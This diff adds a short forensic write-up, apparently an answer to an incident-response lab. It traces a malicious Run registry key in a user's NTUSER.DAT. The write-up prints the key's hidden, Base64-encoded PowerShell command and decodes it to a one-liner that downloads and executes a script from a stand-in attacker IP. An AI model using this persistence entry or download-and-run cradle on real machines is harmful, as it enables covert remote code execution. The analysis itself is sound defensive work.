@@ -1,0 +1,17 @@
+# pending
+
+The malicious entry was found in: `C:\Users\dpatel\NTUSER.DAT`
+
+Inside the following registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+
+Its data launched PowerShell with an encoded command:
+```powershell
+powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAwAC4AMgAuADYANgAvAHUALgBwAHMAMQAnACkA
+```
+
+PowerShell encoded commands use Base64-encoded UTF-16LE. I decoded it:
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://192.0.2.66/u.ps1')
+```
+
+Found IP: 192.0.2.66
